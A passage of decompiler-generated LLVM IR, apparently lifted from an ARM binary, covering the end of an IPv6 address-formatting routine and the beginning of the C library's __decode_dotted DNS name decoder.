  %v7_1bf68 = icmp eq i32 %v0_1bf68, -1
  br i1 %v2_1bf60, label %dec_label_pc_1bf68, label %dec_label_pc_1bf7c

dec_label_pc_1bf68:                               ; preds = %dec_label_pc_1bf54
  br i1 %v7_1bf68, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1bf68
  store i32 %v0_1bfa0, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1bfa0

.thread:                                          ; preds = %dec_label_pc_1bf68
  %v1_1bf74.pre = load i32, i32* @r4, align 4
  %v2_1bf74 = add i32 %v1_1bf74.pre, 1
  store i32 %v2_1bf74, i32* @r4, align 4
  br label %dec_label_pc_1bfa0

dec_label_pc_1bf7c:                               ; preds = %dec_label_pc_1bf54
  br i1 %v7_1bf68, label %dec_label_pc_1bfa0, label %dec_label_pc_1bf84

dec_label_pc_1bf84:                               ; preds = %dec_label_pc_1bf7c
  %v7_1bf84 = icmp eq i32 %v0_1bf84, -1
  %v0_1bf98.pre = load i32, i32* @r4, align 4
  %v1_1bf8c = load i32, i32* @r7, align 4
  %v7_1bf90 = icmp sgt i32 %v0_1bf98.pre, %v1_1bf8c
  %or.cond = or i1 %v7_1bf84, %v7_1bf90
  br i1 %or.cond, label %dec_label_pc_1bf94, label %dec_label_pc_1bf9c

dec_label_pc_1bf94:                               ; preds = %dec_label_pc_1bf84
  store i32 %v0_1bf94, i32* @r6, align 4
  store i32 %v0_1bf98.pre, i32* @r7, align 4
  br label %dec_label_pc_1bf9c

dec_label_pc_1bf9c:                               ; preds = %dec_label_pc_1bf84, %dec_label_pc_1bf94
  %v0_1bf8412 = phi i32 [ %v0_1bf94, %dec_label_pc_1bf94 ], [ %v0_1bf84, %dec_label_pc_1bf84 ]
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1bfa0

dec_label_pc_1bfa0:                               ; preds = %bb, %.thread, %dec_label_pc_1bf7c, %dec_label_pc_1bf9c
  %v0_1bfc8 = phi i32 [ %v0_1bf94, %.thread ], [ %v0_1bfa0, %bb ], [ %v0_1bf94, %dec_label_pc_1bf7c ], [ -1, %dec_label_pc_1bf9c ]
  %v0_1bf687 = phi i32 [ %v0_1bf68, %.thread ], [ %v0_1bfa0, %bb ], [ -1, %dec_label_pc_1bf7c ], [ -1, %dec_label_pc_1bf9c ]
  %v0_1bfb4 = phi i32 [ %v0_1bf84, %.thread ], [ %v0_1bf84, %bb ], [ %v0_1bf84, %dec_label_pc_1bf7c ], [ %v0_1bf8412, %dec_label_pc_1bf9c ]
  %v1_1bfa0 = add nuw nsw i32 %v0_1bfa0, 1
  %v7_1bfa8 = icmp slt i32 %v1_1bfa0, 8
  br i1 %v7_1bfa8, label %dec_label_pc_1bf54, label %dec_label_pc_1bfac

dec_label_pc_1bfac:                               ; preds = %dec_label_pc_1bfa0
  %v7_1bfac = icmp eq i32 %v0_1bfc8, -1
  store i1 %v7_1bfac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1bfac, label %dec_label_pc_1bfac.dec_label_pc_1bfcc_crit_edge, label %dec_label_pc_1bfb4

dec_label_pc_1bfac.dec_label_pc_1bfcc_crit_edge:  ; preds = %dec_label_pc_1bfac
  %v1_1bff0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1bfcc

dec_label_pc_1bfb4:                               ; preds = %dec_label_pc_1bfac
  %v7_1bfb4 = icmp eq i32 %v0_1bfb4, -1
  store i1 %v7_1bfb4, i1* %cpsr_z.global-to-local, align 1
  %v0_1bfc4.pre = load i32, i32* @r4, align 4
  br i1 %v7_1bfb4, label %dec_label_pc_1bfc4, label %dec_label_pc_1bfbc

dec_label_pc_1bfbc:                               ; preds = %dec_label_pc_1bfb4
  %v1_1bfbc = load i32, i32* @r7, align 4
  %v9_1bfbc = icmp eq i32 %v0_1bfc4.pre, %v1_1bfbc
  store i1 %v9_1bfbc, i1* %cpsr_z.global-to-local, align 1
  %v7_1bfc0 = icmp sgt i32 %v0_1bfc4.pre, %v1_1bfbc
  br i1 %v7_1bfc0, label %dec_label_pc_1bfc4, label %dec_label_pc_1bfcc

dec_label_pc_1bfc4:                               ; preds = %dec_label_pc_1bfb4, %dec_label_pc_1bfbc
  store i32 %v0_1bfc4.pre, i32* @r7, align 4
  store i32 %v0_1bfc8, i32* @r6, align 4
  br label %dec_label_pc_1bfcc

dec_label_pc_1bfcc:                               ; preds = %dec_label_pc_1bfac.dec_label_pc_1bfcc_crit_edge, %dec_label_pc_1bfbc, %dec_label_pc_1bfc4
  %v1_1bff0.pre = phi i32 [ %v1_1bfbc, %dec_label_pc_1bfbc ], [ %v1_1bff0.pre.pre, %dec_label_pc_1bfac.dec_label_pc_1bfcc_crit_edge ], [ %v0_1bfc4.pre, %dec_label_pc_1bfc4 ]
  %v0_1bfcc = phi i32 [ %v0_1bfb4, %dec_label_pc_1bfbc ], [ %v0_1bfb4, %dec_label_pc_1bfac.dec_label_pc_1bfcc_crit_edge ], [ %v0_1bfc8, %dec_label_pc_1bfc4 ]
  %v7_1bfcc = icmp eq i32 %v0_1bfcc, -1
  store i1 %v7_1bfcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1bfcc, label %dec_label_pc_1bfcc._crit_edge, label %dec_label_pc_1bfd4

dec_label_pc_1bfd4:                               ; preds = %dec_label_pc_1bfcc
  %v7_1bfd4 = icmp eq i32 %v1_1bff0.pre, 1
  store i1 %v7_1bfd4, i1* %cpsr_z.global-to-local, align 1
  %v7_1bfd8 = icmp slt i32 %v1_1bff0.pre, 2
  br i1 %v7_1bfd8, label %bb54, label %dec_label_pc_1bfcc._crit_edge

bb54:                                             ; preds = %dec_label_pc_1bfd4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1bfcc._crit_edge

dec_label_pc_1bfcc._crit_edge:                    ; preds = %dec_label_pc_1bfcc, %dec_label_pc_1bfd4, %bb54
  %v0_1bff0 = phi i32 [ %v0_1bfcc, %dec_label_pc_1bfd4 ], [ -1, %bb54 ], [ %v0_1bfcc, %dec_label_pc_1bfcc ]
  %v2_1bfe0 = ptrtoint i32* %stack_var_-118 to i32
  store i32 %v2_1bfe0, i32* @r4, align 4
  %v0_1bfe4 = load i32, i32* @r5, align 4
  %v2_1bfe4 = add i32 %v0_1bfe4, -34360
  store i32 %v2_1bfe4, i32* @fp, align 4
  store i32 58, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v2_1bff0 = add i32 %v0_1bff0, %v1_1bff0.pre
  store i32 %v2_1bff0, i32* @sl, align 4
  %v9_1c050 = icmp eq i32 %tmp, 65535
  %v7_1bff868 = icmp eq i32 %v0_1bff0, -1
  store i1 %v7_1bff868, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1bff8

dec_label_pc_1bff8:                               ; preds = %dec_label_pc_1bfcc._crit_edge, %dec_label_pc_1c0a8
  %v7_1bff872 = phi i1 [ %v7_1bff868, %dec_label_pc_1bfcc._crit_edge ], [ %v7_1bff8, %dec_label_pc_1c0a8 ]
  %v0_1c02471 = phi i32 [ 0, %dec_label_pc_1bfcc._crit_edge ], [ %v1_1c0a8, %dec_label_pc_1c0a8 ]
  %v1_1c01070 = phi i32 [ %v0_1bff0, %dec_label_pc_1bfcc._crit_edge ], [ %v0_1bff8.pre, %dec_label_pc_1c0a8 ]
  %v2_1c02869 = phi i32 [ %v2_1bfe0, %dec_label_pc_1bfcc._crit_edge ], [ %v3_1c01429, %dec_label_pc_1c0a8 ]
  br i1 %v7_1bff872, label %dec_label_pc_1c01c, label %dec_label_pc_1c000

dec_label_pc_1c000:                               ; preds = %dec_label_pc_1bff8
  %v9_1c000 = icmp eq i32 %v0_1c02471, %v1_1c01070
  store i1 %v9_1c000, i1* %cpsr_z.global-to-local, align 1
  %v5_1c004 = icmp slt i32 %v0_1c02471, %v1_1c01070
  br i1 %v5_1c004, label %dec_label_pc_1c01c, label %dec_label_pc_1c008

dec_label_pc_1c008:                               ; preds = %dec_label_pc_1c000
  %v1_1c008 = load i32, i32* @sl, align 4
  %v9_1c008 = icmp eq i32 %v0_1c02471, %v1_1c008
  store i1 %v9_1c008, i1* %cpsr_z.global-to-local, align 1
  %v6_1c00c = icmp slt i32 %v0_1c02471, %v1_1c008
  br i1 %v6_1c00c, label %dec_label_pc_1c010, label %dec_label_pc_1c01c

dec_label_pc_1c010:                               ; preds = %dec_label_pc_1c008
  store i1 %v9_1c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1c000, label %bb56, label %dec_label_pc_1c0a8

bb56:                                             ; preds = %dec_label_pc_1c010
  %v1_1c014 = load i32, i32* @sb, align 4
  %v2_1c014 = trunc i32 %v1_1c014 to i8
  %v4_1c014 = inttoptr i32 %v2_1c02869 to i8*
  store i8 %v2_1c014, i8* %v4_1c014, align 1
  %v5_1c014 = load i32, i32* @r4, align 4
  %v6_1c014 = add i32 %v5_1c014, 1
  store i32 %v6_1c014, i32* @r4, align 4
  br label %dec_label_pc_1c0a8

dec_label_pc_1c01c:                               ; preds = %dec_label_pc_1c008, %dec_label_pc_1c000, %dec_label_pc_1bff8
  %v2_1c01c = icmp eq i32 %v0_1c02471, 0
  store i1 %v2_1c01c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c01c, label %dec_label_pc_1c08c, label %dec_label_pc_1c024

dec_label_pc_1c024:                               ; preds = %dec_label_pc_1c01c
  %v7_1c024 = icmp eq i32 %v0_1c02471, 6
  store i1 %v7_1c024, i1* %cpsr_z.global-to-local, align 1
  %v0_1c028 = load i32, i32* @sb, align 4
  %v1_1c028 = trunc i32 %v0_1c028 to i8
  %v3_1c028 = inttoptr i32 %v2_1c02869 to i8*
  store i8 %v1_1c028, i8* %v3_1c028, align 1
  %v4_1c028 = load i32, i32* @r4, align 4
  %v5_1c028 = add i32 %v4_1c028, 1
  store i32 %v5_1c028, i32* @r4, align 4
  %v0_1c02c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1c02c, label %dec_label_pc_1c030, label %dec_label_pc_1c08c

dec_label_pc_1c030:                               ; preds = %dec_label_pc_1c024
  %v0_1c030 = load i32, i32* @r6, align 4
  %v2_1c030 = icmp eq i32 %v0_1c030, 0
  store i1 %v2_1c030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c030, label %dec_label_pc_1c038, label %dec_label_pc_1c08c

dec_label_pc_1c038:                               ; preds = %dec_label_pc_1c030
  %v0_1c038 = load i32, i32* @r7, align 4
  %v7_1c038 = icmp eq i32 %v0_1c038, 6
  store i1 %v7_1c038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c038, label %dec_label_pc_1c058, label %dec_label_pc_1c040

dec_label_pc_1c040:                               ; preds = %dec_label_pc_1c038
  %v7_1c040 = icmp eq i32 %v0_1c038, 5
  store i1 %v7_1c040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c040, label %dec_label_pc_1c048, label %dec_label_pc_1c08c

dec_label_pc_1c048:                               ; preds = %dec_label_pc_1c040
  store i1 %v9_1c050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1c050, label %dec_label_pc_1c058, label %dec_label_pc_1c08c

dec_label_pc_1c058:                               ; preds = %dec_label_pc_1c048, %dec_label_pc_1c038
  %v2_1c05c = sub i32 %v2_1bf28, %v5_1c028
  %v1_1c060 = add i32 %v2_1c05c, -32
  store i32 %v1_1c060, i32* %r2.global-to-local, align 4
  %v0_1c064 = load i32, i32* @r8, align 4
  %v1_1c064 = add i32 %v0_1c064, 12
  store i32 %v1_1c064, i32* %r0.global-to-local, align 4
  %v3_1c06c = call i32 @inet_ntop4(i32 %v1_1c064, i32 %v5_1c028, i32 %v1_1c060)
  store i32 %v3_1c06c, i32* %r0.global-to-local, align 4
  %v2_1c070 = icmp eq i32 %v3_1c06c, 0
  store i1 %v2_1c070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1c070, label %bb57, label %dec_label_pc_1c07c

bb57:                                             ; preds = %dec_label_pc_1c058
  %v1_1c074 = load i32, i32* @r6, align 4
  store i32 %v1_1c074, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c11c

dec_label_pc_1c07c:                               ; preds = %dec_label_pc_1c058
  %v0_1c07c = load i32, i32* @r4, align 4
  %v1_1c07c = inttoptr i32 %v0_1c07c to i8*
  store i32 %v0_1c07c, i32* %r0.global-to-local, align 4
  %v3_1c080 = call i32 @strlen(i8* %v1_1c07c)
  store i32 %v3_1c080, i32* %r0.global-to-local, align 4
  %v0_1c084 = load i32, i32* @r4, align 4
  %v2_1c084 = add i32 %v0_1c084, %v3_1c080
  store i32 %v2_1c084, i32* @r4, align 4
  %v0_1c0bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1c0bc

dec_label_pc_1c08c:                               ; preds = %dec_label_pc_1c048, %dec_label_pc_1c040, %dec_label_pc_1c030, %dec_label_pc_1c024, %dec_label_pc_1c01c
  %v0_1c094 = phi i32 [ %v5_1c028, %dec_label_pc_1c048 ], [ %v5_1c028, %dec_label_pc_1c040 ], [ %v5_1c028, %dec_label_pc_1c030 ], [ %v5_1c028, %dec_label_pc_1c024 ], [ %v2_1c02869, %dec_label_pc_1c01c ]
  store i32 %v2_1bf28, i32* @lr, align 4
  %v1_1c090 = load i32, i32* @r5, align 4
  %v4_1c090 = mul i32 %v1_1c090, 4
  %v5_1c090 = add i32 %v4_1c090, %v2_1bf28
  store i32 %v0_1c094, i32* @r0, align 4
  %v1_1c098 = add i32 %v5_1c090, -32
  %v2_1c098 = inttoptr i32 %v1_1c098 to i32*
  %v3_1c098 = load i32, i32* %v2_1c098, align 4
  store i32 %v3_1c098, i32* %r2.global-to-local, align 4
  %v0_1c09c = load i32, i32* @fp, align 4
  %v7_1c0a0 = call i32 @sprintf(i32 %v0_1c094, i32 %v0_1c09c, i32 %v3_1c098, i32 %v5_1c090, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1c0a0, i32* %r0.global-to-local, align 4
  %v0_1c0a4 = load i32, i32* @r4, align 4
  %v2_1c0a4 = add i32 %v0_1c0a4, %v7_1c0a0
  store i32 %v2_1c0a4, i32* @r4, align 4
  br label %dec_label_pc_1c0a8

dec_label_pc_1c0a8:                               ; preds = %bb56, %dec_label_pc_1c010, %dec_label_pc_1c08c
  %v3_1c01429 = phi i32 [ %v6_1c014, %bb56 ], [ %v2_1c02869, %dec_label_pc_1c010 ], [ %v2_1c0a4, %dec_label_pc_1c08c ]
  %v0_1c0a8 = load i32, i32* @r5, align 4
  %v1_1c0a8 = add i32 %v0_1c0a8, 1
  store i32 %v1_1c0a8, i32* @r5, align 4
  %v0_1bff8.pre = load i32, i32* @r6, align 4
  %v7_1c0b0 = icmp slt i32 %v1_1c0a8, 8
  %v7_1bff8 = icmp eq i32 %v0_1bff8.pre, -1
  store i1 %v7_1bff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c0b0, label %dec_label_pc_1bff8, label %dec_label_pc_1c0b4

dec_label_pc_1c0b4:                               ; preds = %dec_label_pc_1c0a8
  br i1 %v7_1bff8, label %.thread2, label %dec_label_pc_1c0bc

dec_label_pc_1c0bc:                               ; preds = %dec_label_pc_1c0b4, %dec_label_pc_1c07c
  %v3_1c0c8 = phi i32 [ %v3_1c01429, %dec_label_pc_1c0b4 ], [ %v2_1c084, %dec_label_pc_1c07c ]
  %v0_1c0bc = phi i32 [ %v0_1bff8.pre, %dec_label_pc_1c0b4 ], [ %v0_1c0bc.pre, %dec_label_pc_1c07c ]
  %v1_1c0bc = load i32, i32* @r7, align 4
  %v2_1c0bc = add i32 %v1_1c0bc, %v0_1c0bc
  %v7_1c0c0 = icmp eq i32 %v2_1c0bc, 8
  store i1 %v7_1c0c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1c0c0, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1c0bc
  %v4_1c0c8 = inttoptr i32 %v3_1c0c8 to i8*
  store i8 58, i8* %v4_1c0c8, align 1
  %v5_1c0c8 = load i32, i32* @r4, align 4
  %v6_1c0c8 = add i32 %v5_1c0c8, 1
  store i32 %v6_1c0c8, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1c0bc, %dec_label_pc_1c0b4, %bb58
  %v2_1c0d0 = phi i32 [ %v3_1c0c8, %dec_label_pc_1c0bc ], [ %v3_1c01429, %dec_label_pc_1c0b4 ], [ %v6_1c0c8, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1c0d0 = inttoptr i32 %v2_1c0d0 to i8*
  store i8 0, i8* %v3_1c0d0, align 1
  %v4_1c0d0 = load i32, i32* @r4, align 4
  %v5_1c0d0 = add i32 %v4_1c0d0, 1
  store i32 %v2_1bfe0, i32* @r1, align 4
  %v2_1c0d8 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1c0d8, i32* %r2.global-to-local, align 4
  %v2_1c0dc = sub i32 %v5_1c0d0, %v2_1bfe0
  %v9_1c0e0 = icmp eq i32 %v2_1c0dc, %v2_1c0d8
  store i1 %v9_1c0e0, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_1c0dc, %v2_1c0d8
  br i1 %tmp75, label %dec_label_pc_1c0e8, label %dec_label_pc_1c0fc

dec_label_pc_1c0e8:                               ; preds = %.thread2
  %v0_1c0e8 = call i32 @__GI___errno_location()
  store i32 %v0_1c0e8, i32* %r0.global-to-local, align 4
  %v0_1c0f0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1c0f0, i32* %r2.global-to-local, align 4
  %v2_1c0f4 = inttoptr i32 %v0_1c0e8 to i32*
  store i32 28, i32* %v2_1c0f4, align 4
  %v0_1c11c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c11c

dec_label_pc_1c0fc:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1c100 = inttoptr i32 %arg3 to i8*
  %v3_1c100 = call i32 @strcpy(i8* %v2_1c100, i32 %v2_1bfe0)
  br label %dec_label_pc_1c104

dec_label_pc_1c104:                               ; preds = %dec_label_pc_1bee4, %dec_label_pc_1c0fc
  %storemerge = phi i32 [ %v3_1bef0, %dec_label_pc_1bee4 ], [ %v3_1c100, %dec_label_pc_1c0fc ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c11c

dec_label_pc_1c10c:                               ; preds = %dec_label_pc_1bed8
  %v0_1c10c = call i32 @__GI___errno_location()
  store i32 %v0_1c10c, i32* %r0.global-to-local, align 4
  %v2_1c114 = inttoptr i32 %v0_1c10c to i32*
  store i32 97, i32* %v2_1c114, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1c11c

dec_label_pc_1c11c:                               ; preds = %bb57, %dec_label_pc_1c104, %dec_label_pc_1c0e8, %dec_label_pc_1c10c
  %v0_1c11c = phi i32 [ %v1_1c074, %bb57 ], [ %storemerge, %dec_label_pc_1c104 ], [ %v0_1c11c.pre, %dec_label_pc_1c0e8 ], [ 0, %dec_label_pc_1c10c ]
  store i32 %v0_1c11c, i32* %r0.global-to-local, align 4
  store i32 %v6_1beb4, i32* %r5.global-to-local, align 4
  ret i32 %v0_1c11c

; uselistorder directives
  uselistorder i32 %v0_1c11c, { 1, 0 }
  uselistorder i1 %v7_1bff8, { 2, 0, 1 }
  uselistorder i32 %v0_1bff8.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1c0a8, { 0, 2, 1 }
  uselistorder i32 %v0_1c094, { 1, 0 }
  uselistorder i32 %v0_1c07c, { 1, 0 }
  uselistorder i32 %v5_1c028, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_1c000, { 1, 0, 2 }
  uselistorder i32 %v2_1c02869, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1c02471, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1bff868, { 1, 0 }
  uselistorder i32 %v2_1bfe0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1bff0, { 1, 0, 2 }
  uselistorder i1 %v7_1bfcc, { 1, 0 }
  uselistorder i32 %v0_1bfcc, { 1, 2, 0 }
  uselistorder i32 %v1_1bff0.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1bfc4.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1bfb4, { 1, 0 }
  uselistorder i1 %v7_1bfac, { 1, 0 }
  uselistorder i32 %v1_1bfa0, { 1, 0 }
  uselistorder i32 %v0_1bfb4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1bfc8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1bf68, { 1, 0 }
  uselistorder i32 %v0_1bfa0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1bf84, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1bf94, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1bf24, { 1, 0, 2 }
  uselistorder i32 %v2_1bf0c, { 1, 0 }
  uselistorder i32 %v0_1bf24, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1bf28, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 16, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 23, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 9, 1, 0, 8, 10, 2, 3, 4, 7 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1c11c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1c104, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1c0a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1bff8, { 1, 0 }
  uselistorder label %dec_label_pc_1bfcc._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bfcc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bfc4, { 1, 0 }
  uselistorder label %dec_label_pc_1bfa0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1bf9c, { 1, 0 }
  uselistorder label %dec_label_pc_1bf54, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1c138 = load i32, i32* @r5, align 4
  %v0_1c13c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1c13c, i32* %sl.global-to-local, align 4
  %v2_1c13c = icmp eq i32 %v0_1c13c, 0
  br i1 %v2_1c13c, label %.thread30, label %dec_label_pc_1c164.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1c224

dec_label_pc_1c164.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1c1644 = load i32, i32* @r1, align 4
  %v6_1c16814 = icmp slt i32 %v0_1c1644, %arg2
  br i1 %v6_1c16814, label %dec_label_pc_1c16c.preheader, label %dec_label_pc_1c224

dec_label_pc_1c16c.preheader:                     ; preds = %dec_label_pc_1c164.preheader
  %v2_1c16c51 = add i32 %v0_1c13c, %v0_1c1644
  %v3_1c16c52 = inttoptr i32 %v2_1c16c51 to i8*
  %v4_1c16c53 = load i8, i8* %v3_1c16c52, align 1
  %v6_1c16c54 = zext i8 %v4_1c16c53 to i32
  store i32 %v6_1c16c54, i32* @r4, align 4
  %v2_1c17055 = icmp eq i8 %v4_1c16c53, 0
  br i1 %v2_1c17055, label %bb49, label %dec_label_pc_1c178

dec_label_pc_1c160:                               ; preds = %bb48, %bb44
  %v1_1c164 = phi i32 [ %v1_1c164.pre, %bb48 ], [ %v1_1c19059, %bb44 ]
  %v0_1c164 = phi i32 [ %v0_1c164.pre, %bb48 ], [ %v5_1c1a8, %bb44 ]
  %v0_1c160 = phi i32 [ %v0_1c160.pre, %bb48 ], [ %v0_1c1ac60, %bb44 ]
  store i32 %v0_1c160, i32* %r0.global-to-local, align 4
  %v6_1c168 = icmp slt i32 %v0_1c164, %v1_1c164
  br i1 %v6_1c168, label %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge, label %dec_label_pc_1c224

dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge:  ; preds = %dec_label_pc_1c160
  %v0_1c16c.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1c16c = add i32 %v0_1c16c.pre, %v0_1c164
  %v3_1c16c = inttoptr i32 %v2_1c16c to i8*
  %v4_1c16c = load i8, i8* %v3_1c16c, align 1
  %v6_1c16c = zext i8 %v4_1c16c to i32
  store i32 %v6_1c16c, i32* @r4, align 4
  %v2_1c170 = icmp eq i8 %v4_1c16c, 0
  %v0_1c210 = load i32, i32* @ip, align 4
  %v2_1c210 = icmp eq i32 %v0_1c210, 0
  br i1 %v2_1c170, label %dec_label_pc_1c210, label %dec_label_pc_1c178

dec_label_pc_1c178:                               ; preds = %dec_label_pc_1c16c.preheader, %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge
  %v2_1c21066 = phi i1 [ %v2_1c210, %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge ], [ false, %dec_label_pc_1c16c.preheader ]
  %v0_1c21064 = phi i32 [ %v0_1c210, %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge ], [ 1, %dec_label_pc_1c16c.preheader ]
  %v6_1c16c63 = phi i32 [ %v6_1c16c, %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge ], [ %v6_1c16c54, %dec_label_pc_1c16c.preheader ]
  %v0_1c19862 = phi i32 [ %v0_1c16c.pre, %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge ], [ %v0_1c13c, %dec_label_pc_1c16c.preheader ]
  %v0_1c18861 = phi i32 [ %v0_1c164, %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge ], [ %v0_1c1644, %dec_label_pc_1c16c.preheader ]
  %v0_1c1ac60 = phi i32 [ %v0_1c160, %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge ], [ 0, %dec_label_pc_1c16c.preheader ]
  %v1_1c19059 = phi i32 [ %v1_1c164, %dec_label_pc_1c160.dec_label_pc_1c16c_crit_edge ], [ %arg2, %dec_label_pc_1c16c.preheader ]
  %v1_1c17c = and i32 %v6_1c16c63, 192
  br i1 %v2_1c21066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_1c178
  %v1_1c180 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c180 = add i32 %v1_1c180, 1
  store i32 %v2_1c180, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1c178, %bb
  %v2_1c184 = icmp eq i32 %v1_1c17c, 192
  %v1_1c188 = add i32 %v0_1c18861, 1
  store i32 %v1_1c188, i32* %r1.global-to-local, align 4
  br i1 %v2_1c184, label %dec_label_pc_1c190, label %dec_label_pc_1c1b8

dec_label_pc_1c190:                               ; preds = %bb42
  %v6_1c194 = icmp slt i32 %v1_1c188, %v1_1c19059
  br i1 %v6_1c194, label %dec_label_pc_1c198, label %dec_label_pc_1c224

dec_label_pc_1c198:                               ; preds = %dec_label_pc_1c190
  %v2_1c198 = add i32 %v1_1c188, %v0_1c19862
  %v3_1c198 = inttoptr i32 %v2_1c198 to i8*
  %v4_1c198 = load i8, i8* %v3_1c198, align 1
  %v6_1c198 = zext i8 %v4_1c198 to i32
  %v1_1c1a0 = urem i32 %v6_1c16c63, 64
  br i1 %v2_1c21066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1c198
  %v1_1c1a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1c1a4 = add i32 %v1_1c1a4, 1
  store i32 %v2_1c1a4, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1c198, %bb43
  %v4_1c1a8 = mul nuw nsw i32 %v1_1c1a0, 256
  %v5_1c1a8 = or i32 %v6_1c198, %v4_1c1a8
  store i32 %v5_1c1a8, i32* %r1.global-to-local, align 4
  store i32 %v0_1c1ac60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1c160
